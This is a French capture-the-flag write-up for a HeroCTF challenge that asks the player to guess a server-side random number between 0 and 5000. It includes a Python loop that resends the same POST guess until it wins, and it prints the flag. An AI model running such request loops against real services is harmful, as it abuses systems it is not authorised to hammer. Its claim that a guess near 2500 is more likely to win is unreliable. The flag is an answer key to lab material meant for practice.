Ce challenge, comme le dit l'énoncé, est fait pour être bruteforcé !

Le principe est de trouver le nombre entre 0 et 5000 choisi aléatoirement coté serveur.

Pour résoudre ce challenge, on peut par exemple utiliser l'outil Burp Suite ou faire un rapide script en python (on choisit un nombre proche de 5000/2 = 2500 pour une plus grande probabilité):
```python
import requests

url = "http://heroctf.fr:4444/hasard.php"
r = requests.post(url, data={'choice':'2532'})

while 'try again' in r.text:
    try:
        r = requests.post(url, data={'choice':'2532'})
    except ConnectionError as e:
        print("[!] Connexion timed out")

print(r.text)
```
On peut ensuite exécuter le script en cherchant le flag dans l'outpout
```bash
$ python BF_request.py | grep HeroCTF
    <span class="navbar-brand mb-0 h1">HeroCTF</span>
        <h2><br>Wow, so much luck... <br> HeroCTF{brut3f0rc3_w4s_th3_w4y}</h2>         </div>
```
HeroCTF{brut3f0rc3_w4s_th3_w4y}
